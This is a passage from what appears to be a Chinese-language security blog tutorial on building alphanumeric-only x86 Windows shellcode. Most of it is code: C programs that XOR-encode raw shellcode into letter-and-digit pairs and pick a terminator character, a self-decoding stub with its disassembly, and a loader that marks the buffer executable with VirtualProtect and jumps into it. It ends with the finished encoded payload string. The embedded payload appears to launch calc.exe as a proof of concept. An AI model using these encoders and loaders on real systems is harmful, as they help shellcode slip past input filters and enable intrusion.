class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#define KEY 0x97</span><br><span class="line">//定义ANSIC字符串编码过的shellcode KEY=0x97</span><br><span class="line">char shellcode[] ="\x7e\x1\x97\x97\x97\xc1\xa6\x5e\xf3\x1c\xe6\xa7\x1c\xe1\x9b\x1c\xe1\x8b\x1c\xd1"</span><br><span class="line">"\x9f\x1c\xe9\xb7\x1c\xa1\xf1\xae\xd8\x8f\xe2\x65\xc9\x54\xf7\x1c\xfb\xb3\xb3\x1c"</span><br><span class="line">"\xd2\xab\x1c\xc3\x92\xef\x96\x7d\x1c\xdd\x8f\x1c\xcd\xb7\x96\x7c\x74\xa0\xde\x1c"</span><br><span class="line">"\xa3\x1c\x96\x79\xa6\x68\xa6\x57\x6b\x3b\x13\x57\xe3\x9d\x56\x58\x9a\x96\x50\x7e"</span><br><span class="line">"\x66\x68\x68\x68\xac\xeb\xb3\xbf\xe2\x49\x1c\xcd\xb3\x96\x7c\xf1\x1c\x9b\xdc\x1c"</span><br><span class="line">"\xcd\x8b\x96\x7c\x1c\x93\x1c\x96\x7f\x1e\xd3\xb3\x8b\xf6\x54\x3a\xc7\xc5\x7f\x30"</span><br><span class="line">"\x68\x68\x68\x1e\x90\x16\x53\x9f\x97\x97\x97\x16\x50\x93\x97\x97\x97\xae\x59\xe2"</span><br><span class="line">"\x71\x54\x7f\x8e\x97\x97\x97\xf\x69\x1d\x99\xe9\x4f\x75\xe4\x16\x7b\x9f\x97\x97"</span><br><span class="line">"\x97\x1e\x72\x7f\xca\x68\x68\x68\x1e\x55\x7c\x75\xc9\x1a\xea\x93\x1e\x66\x16\x56"</span><br><span class="line">"\x9f\x97\x97\x97\x7f\x21\x68\x68\x68\x7c\x99\xcc\xa6\x57\xc7\xc4\x68\xc2\x93\xa6"</span><br><span class="line">"\x57\xc7\x68\xc2\x9f\x7f\x7a\x68\x68\x68\xf4\xf6\xfb\xf4\xb9\xf2\xef\xf2";</span><br><span class="line">//using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	std::cout&lt;&lt;shellcode&lt;&lt;std::endl;</span><br><span class="line">/*</span><br><span class="line">	//ANSIC转到宽字符</span><br><span class="line">	int Length = MultiByteToWideChar(CP_ACP,0,shellcode,-1,NULL,0);</span><br><span class="line">	wchar_t *pWideCharStr = new wchar_t[sizeof(wchar_t)*Length];</span><br><span class="line">	MultiByteToWideChar(CP_ACP,0,shellcode,-1,pWideCharStr,Length*sizeof(wchar_t));</span><br><span class="line">	std::wcout&lt;&lt;"MultiByteToWideChar:"&lt;&lt;pWideCharStr&lt;&lt;std::endl;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">	int Length = MultiByteToWideChar (</span><br><span class="line">		CP_ACP,   //当前系统ANSI代码页，将宽字符转换为ANSI</span><br><span class="line">		0,		//指定如何处理没有转换的字符</span><br><span class="line">		shellcode,  //待转换字符串地址</span><br><span class="line">		-1,		</span><br><span class="line">		NULL,	//</span><br><span class="line">		0);</span><br><span class="line">	wchar_t *pWideCharStr;</span><br><span class="line">	pWideCharStr = new wchar_t[sizeof(wchar_t)*Length];</span><br><span class="line">	if(!pWideCharStr)</span><br><span class="line">	&#123;</span><br><span class="line">		delete []pWideCharStr;</span><br><span class="line">	&#125;</span><br><span class="line">	MultiByteToWideChar (CP_ACP, 0, shellcode, -1, pWideCharStr, sizeof(wchar_t)*Length);</span><br><span class="line">	//delete []psText;</span><br><span class="line">	printf("MultiByteToWideChar:\n");</span><br><span class="line">	for (int i = 0; i &lt; Length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		printf("%x ",pWideCharStr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	printf("\n");</span><br><span class="line">	//宽字符转换到ANSIC</span><br><span class="line">	Length = WideCharToMultiByte(CP_ACP,0,pWideCharStr,-1,NULL,0,NULL,NULL);</span><br><span class="line">	char *pMultiByte = new char[Length*sizeof(char)] ;</span><br><span class="line">	WideCharToMultiByte(CP_ACP,0,pWideCharStr,-1,pMultiByte,Length*sizeof(char),NULL,NULL);</span><br><span class="line">	std::cout&lt;&lt;"WideCharToMultiByte:"&lt;&lt;std::endl&lt;&lt;pMultiByte&lt;&lt;std::endl;</span><br><span class="line">	//delete [] pWideCharStr;</span><br><span class="line">	delete [] pMultiByte;</span><br><span class="line">	//解码KEY= 0x97</span><br><span class="line">	int i;</span><br><span class="line">	int nLen;</span><br><span class="line">	nLen = Length; //获得enShellCode的长度</span><br><span class="line">	unsigned char deshellcode[500]; //解码后的deShellCode</span><br><span class="line">	printf("deshellcode:\n");</span><br><span class="line">	for(i=0; i&lt;nLen; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		deshellcode[i] = pWideCharStr[i] ^ KEY; //对每一位enShellCode作xor key编码KEY=0x97</span><br><span class="line">		//printf("\\x%x-",shellcode[i]); </span><br><span class="line">		printf("\\x%x",deshellcode[i]); //打印出效果</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果可以很清楚的看到，未经过纯字母数字编码的shellcode，经过两次转换后已经变形，如下图所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/Alphanumeric-shellcode-1.png" alt=""><br>我只标注了第一行变形的代码，这样转换过的deshellcode（已经和原来的shellcode不同了）肯定是不能够执行的。</p>
<h3 id="构造纯字母数字shellcode">构造纯字母数字shellcode</h3><p>1.先将我们的shellcode进行纯字母数字编码,源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line">&#123;</span><br><span class="line">	<span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x31</span>, <span class="number">0xC9</span>, <span class="number">0x64</span>, <span class="number">0x8B</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x8B</span>, <span class="number">0x76</span>, <span class="number">0x0C</span>, <span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0x76</span>, <span class="number">0x1C</span>, <span class="number">0x8B</span>, <span class="number">0x46</span>, <span class="number">0x08</span>, <span class="number">0x8B</span>, <span class="number">0x7E</span>, <span class="number">0x20</span>, <span class="number">0x8B</span>, <span class="number">0x36</span>, <span class="number">0x66</span>, <span class="number">0x39</span>, <span class="number">0x4F</span>, <span class="number">0x18</span>, <span class="number">0x75</span>, <span class="number">0xF2</span>,</span><br><span class="line">	<span class="number">0x5E</span>, <span class="number">0xC3</span>, <span class="number">0x60</span>, <span class="number">0x8B</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x3C</span>, <span class="number">0x8B</span>, <span class="number">0x54</span>, <span class="number">0x05</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0xEA</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x4A</span>, <span class="number">0x18</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xEB</span>, <span class="number">0xE3</span>, <span class="number">0x37</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x34</span>, <span class="number">0x8B</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>,</span><br><span class="line">	<span class="number">0x31</span>, <span class="number">0xFF</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0xFC</span>, <span class="number">0xAC</span>, <span class="number">0x84</span>, <span class="number">0xC0</span>, <span class="number">0x74</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0xCF</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0xC7</span>, <span class="number">0xE9</span>,</span><br><span class="line">	<span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x3B</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0x75</span>, <span class="number">0xDE</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xEB</span>, <span class="number">0x66</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x0C</span>, <span class="number">0x4B</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x1C</span>, <span class="number">0x01</span>, <span class="number">0xEB</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x8B</span>, <span class="number">0x01</span>, <span class="number">0xE8</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,</span><br><span class="line">	<span class="number">0x1C</span>, <span class="number">0x61</span>, <span class="number">0xC3</span>, <span class="number">0xAD</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0xE8</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x89</span>, <span class="number">0x07</span>, <span class="number">0x81</span>, <span class="number">0xC4</span>, <span class="number">0x08</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x81</span>, <span class="number">0xC7</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0xCE</span>, <span class="number">0x75</span>, <span class="number">0xE6</span>, <span class="number">0xC3</span>, <span class="number">0xE8</span>, <span class="number">0x19</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x98</span>, <span class="number">0xFE</span>, <span class="number">0x8A</span>, <span class="number">0x0E</span>, <span class="number">0x7E</span>, <span class="number">0xD8</span>, <span class="number">0xE2</span>, <span class="number">0x73</span>, <span class="number">0x81</span>, <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x89</span>, <span class="number">0xE5</span>, <span class="number">0xE8</span>, <span class="number">0x5D</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x89</span>, <span class="number">0xC2</span>, <span class="number">0xEB</span>, <span class="number">0xE2</span>, <span class="number">0x5E</span>, <span class="number">0x8D</span>, <span class="number">0x7D</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x89</span>, <span class="number">0xF1</span>, <span class="number">0x81</span>, <span class="number">0xC1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE8</span>, <span class="number">0xB6</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xEB</span>, <span class="number">0x0E</span>, <span class="number">0x5B</span>,</span><br><span class="line">	<span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0xFF</span>, <span class="number">0x55</span>, <span class="number">0x04</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x50</span>, <span class="number">0xFF</span>, <span class="number">0x55</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0xED</span>, <span class="number">0xFF</span>,</span><br><span class="line">	<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x2E</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x65</span>, <span class="number">0x00</span>  </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//unsigned char ptr[0x1000] = &#123;0&#125;;  </span></span><br><span class="line">	<span class="keyword">int</span> nLen, i;</span><br><span class="line">	<span class="keyword">int</span> A, B;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> t1, t2;</span><br><span class="line">	<span class="comment">// nLen = strlen((char *)shellcode);</span></span><br><span class="line">	nLen = <span class="keyword">sizeof</span> (shellcode);</span><br><span class="line">	i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>) </span><br><span class="line">	&#123;</span><br><span class="line">	encode:</span><br><span class="line">		<span class="keyword">if</span>(i &gt;= nLen)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(A = <span class="number">0x30</span>; A &lt; <span class="number">0X7B</span>; A++) <span class="comment">//0开始到z</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>( (A &gt; <span class="number">0x39</span> &amp;&amp; A &lt; <span class="number">0x41</span>) || (A &gt; <span class="number">0x5A</span> &amp;&amp; A &lt; <span class="number">0x61</span>) )	<span class="comment">//非字母数字部分</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;            </span><br><span class="line">			<span class="keyword">for</span>(B = <span class="number">0x30</span>; B &lt; <span class="number">0x7B</span>; B++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>( (B &gt; <span class="number">0x39</span> &amp;&amp; B &lt; <span class="number">0x41</span>) || (B &gt; <span class="number">0x5A</span> &amp;&amp; B &lt; <span class="number">0x61</span>) )	</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				t1 = A * <span class="number">0x58</span>; <span class="comment">//0x58:X</span></span><br><span class="line">				t1 = t1 &lt;&lt; <span class="number">24</span>;</span><br><span class="line">				t1 = t1 &gt;&gt; <span class="number">24</span>;</span><br><span class="line">				t2 = shellcode[i] ^ B; <span class="comment">//异或</span></span><br><span class="line">				t2 = t2 &lt;&lt; <span class="number">24</span>;</span><br><span class="line">				t2 = t2 &gt;&gt; <span class="number">24</span>;</span><br><span class="line">				<span class="keyword">if</span>( t1 == t2 )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"%c%c"</span>, A, B);</span><br><span class="line">					i++;</span><br><span class="line">					<span class="keyword">goto</span> encode;</span><br><span class="line">				&#125;			</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//printf("%s\n", ptr);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编码后的shellcode:</span><br><span class="line">"0i1N2020202f8q0I2T1S2A8p1S2F541S2FAD1S2v281S2NAx1S8v2V8y5w8X2E0r2n0C2P1S5T8d8d1S"</span><br><span class="line">"2uAd1S2d252H210j1S2z8X1S2jAx210k0c8w2y1S8t1S210n8q3w8q3H3t1t4d3H2D520A0O55210G0i"</span><br><span class="line">"0q3w3w3wAc2L8d8h2E3V1S2j8d210k2V1S545s1S2jAD210k1S241S210h1Q2t8dAD2Q0C1u5h2b0h4G"</span><br><span class="line">"3w3w3w1Q271Y0D282020201Y0G242020208y0N2E0f0C0h8Y2020204x3v1R562N0X0b2C1Y0l282020"</span><br><span class="line">"201Q0e0h2m3w3w3w1Q0B0k0b2n1U2M241Q0q1Y0A282020200h063w3w3w0k562k8q3H5h2c3w2e248q"</span><br><span class="line">"3H5h3w2e280h0m3w3w3w2S2Q5T2S8n2U2H2U20"</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p>2.然后将编码后的shellcode进行过滤，目的是为了解码时候当作解码结束的识别符号,源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"windows.h"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"stdio.h"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"string.h"</span></span></span><br><span class="line"><span class="comment">//结尾字符过滤，由于选择特殊字符</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> alphasc[] = <span class="string">"0i1N2020202f8q0I2T1S2A8p1S2F541S2FAD1S2v281S2NAx1S8v2V8y5w8X2E0r2n0C2P1S5T8d8d1S"</span></span><br><span class="line">	<span class="string">"2uAd1S2d252H210j1S2z8X1S2jAx210k0c8w2y1S8t1S210n8q3w8q3H3t1t4d3H2D520A0O55210G0i"</span></span><br><span class="line">	<span class="string">"0q3w3w3wAc2L8d8h2E3V1S2j8d210k2V1S545s1S2jAD210k1S241S210h1Q2t8dAD2Q0C1u5h2b0h4G"</span></span><br><span class="line">	<span class="string">"3w3w3w1Q271Y0D282020201Y0G242020208y0N2E0f0C0h8Y2020204x3v1R562N0X0b2C1Y0l282020"</span></span><br><span class="line">	<span class="string">"201Q0e0h2m3w3w3w1Q0B0k0b2n1U2M241Q0q1Y0A282020200h063w3w3w0k562k8q3H5h2c3w2e"</span></span><br><span class="line">	<span class="string">"248q3H5h3w2e280h0m3w3w3w2S2Q5T2S8n2U2H2U20"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line">	BOOL bOK;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0x30</span>; i &lt; <span class="number">0x7b</span>; i++) <span class="comment">//0x30 0  0x7a z</span></span><br><span class="line">	&#123;</span><br><span class="line">		bOK = TRUE;</span><br><span class="line">		<span class="keyword">if</span>((i &gt; <span class="number">0x39</span> &amp;&amp; i &lt; <span class="number">0x41</span>) || (i &gt; <span class="number">0x5A</span> &amp;&amp; i &lt; <span class="number">0x61</span>))  <span class="comment">// 39-41 5a-61之间是非数字字母部分</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)alphasc); j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(alphasc[j] == i)</span><br><span class="line">			&#123;</span><br><span class="line">				bOK = FALSE;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(bOK == TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%c "</span>, i); <span class="comment">//打印出数组中没有的字母和数字 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 9 J K W Z a g o  过滤出来的字符，可选择任意一个当作判断解码结束的字符。</span></span><br></pre></td></tr></table></figure>
<ol>
<li>解码shellcode源码如下：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">static</span> <span class="keyword">char</span>  sc[] = </span><br><span class="line">	<span class="string">"PZhguaiX5guaiH4C0B6RYkA7XA3A7A2B70B7BhTWUQX5TWUQ4a8A7ub"</span><span class="comment">//倒数第六个字母为filter过滤的字母</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		00421A30 50                   push        eax //实际应用中，一般都会有积存器指向sc，如esp,eax，ebx等</span><br><span class="line">		00421A31 5A                   pop         edx</span><br><span class="line">		00421A32 68 67 75 61 69       push        69617567h</span><br><span class="line">		00421A37 58                   pop         eax</span><br><span class="line">		00421A38 35 67 75 61 69       xor         eax,69617567h</span><br><span class="line">		00421A3D 48                   dec         eax</span><br><span class="line">		00421A3E 34 43                xor         al,43h</span><br><span class="line">		00421A40 30 42 36             xor         byte ptr [edx+36h],al //[edx+36h]存放着编码过的shellcode</span><br><span class="line">		00421A43 52                   push        edx</span><br><span class="line">		00421A44 59                   pop         ecx</span><br><span class="line">		00421A45 6B 41 37 58          imul        eax,dword ptr [ecx+37h],58h</span><br><span class="line">		00421A49 41                   inc         ecx</span><br><span class="line">		00421A4A 33 41 37             xor         eax,dword ptr [ecx+37h]</span><br><span class="line">		00421A4D 41                   inc         ecx</span><br><span class="line">		00421A4E 32 42 37             xor         al,byte ptr [edx+37h]</span><br><span class="line">		00421A51 30 42 37             xor         byte ptr [edx+37h],al</span><br><span class="line">		00421A54 42                   inc         edx</span><br><span class="line">		00421A55 68 54 57 55 51       push        51555754h</span><br><span class="line">		00421A5A 58                   pop         eax</span><br><span class="line">		00421A5B 35 54 57 55 51       xor         eax,51555754h</span><br><span class="line">		00421A60 34 63                xor         al,79h //79可根据实际情况替换，解码结束判断符。</span><br><span class="line">		00421A62 38 41 37             cmp         byte ptr [ecx+37h],al</span><br><span class="line">		00421A65 75 62                jne         sc+99h (00421ac9) //</span><br><span class="line">		上面这部分是解码部分，解码结尾标记，如本例子中的aa(61h)，需要使用filter进行过滤分析之后得到的</span><br><span class="line">	*/</span></span><br><span class="line">	<span class="comment">//下面是编码后的shellcode，编码方式为base16，算法为sc[i] ^ B == A * 0x58</span></span><br><span class="line">	<span class="string">"0i1N2020202f8q0I2T1S2A8p1S2F541S2FAD1S2v281S2NAx1S8v2V8y5w8X2E0r2n0C2P1S5T8d8d1S"</span></span><br><span class="line">	<span class="string">"2uAd1S2d252H210j1S2z8X1S2jAx210k0c8w2y1S8t1S210n8q3w8q3H3t1t4d3H2D520A0O55210G0i"</span></span><br><span class="line">	<span class="string">"0q3w3w3wAc2L8d8h2E3V1S2j8d210k2V1S545s1S2jAD210k1S241S210h1Q2t8dAD2Q0C1u5h2b0h4G"</span></span><br><span class="line">	<span class="string">"3w3w3w1Q271Y0D282020201Y0G242020208y0N2E0f0C0h8Y2020204x3v1R562N0X0b2C1Y0l282020"</span></span><br><span class="line">	<span class="string">"201Q0e0h2m3w3w3w1Q0B0k0b2n1U2M241Q0q1Y0A282020200h063w3w3w0k562k8q3H5h2c3"</span></span><br><span class="line">	<span class="string">"w2e248q3H5h3w2e280h0m3w3w3w2S2Q5T2S8n2U2H2U20aa"</span>;<span class="comment">//aa为结束标识符</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> size = <span class="keyword">sizeof</span>(sc);</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line">	<span class="keyword">bool</span> p = VirtualProtect(sc,size,<span class="number">0x40</span>,&amp;dwOldProtect);</span><br><span class="line">	<span class="keyword">if</span> (p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"fault!\n"</span>);</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp,esp</span><br><span class="line">		</span><br><span class="line">		xor ecx, ecx</span><br><span class="line">		lea eax, sc</span><br><span class="line">		call eax</span><br><span class="line">		</span><br><span class="line">		mov esp,ebp</span><br><span class="line">		pop ebp</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//((void (*)(void))&amp;sc)();</span></span><br><span class="line">	<span class="comment">/* </span><br><span class="line">	for(int i=0;i&lt;161;i++)</span><br><span class="line">		printf("%x ",sc[i+55]); //37h</span><br><span class="line">		printf("\n");</span><br><span class="line">	*/</span></span><br><span class="line">	<span class="comment">//  return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们整个构造的纯字母数字shellcode即为：</p>
<pre><code>"PZhguaiX5guaiH4C0B6RYkA7XA<span class="number">3A7A2B70</span>B7BhTWUQX5TWUQ4a8A7ub" //倒数第六个为过滤出来的字符a
"<span class="number">0i1N2020202</span>f<span class="number">8q0I2T1</span>S<span class="number">2A8p1S2</span>F541S2FAD<span class="number">1S2v281</span>S2NAx<span class="number">1S8v2V8</span>y<span class="number">5w8X2E0</span>r<span class="number">2n0C2P1</span>S<span class="number">5T8d8d1</span>S"
"2uAd<span class="number">1S2d252H210</span>j<span class="number">1S2z8X1</span>S2jAx<span class="number">210k0c8w2</span>y<span class="number">1S8t1S210</span>n<span class="number">8q3w8q3</span>H<span class="number">3t1t4d3</span>H<span class="number">2D520A0</span>O<span class="number">55210G0</span>i"
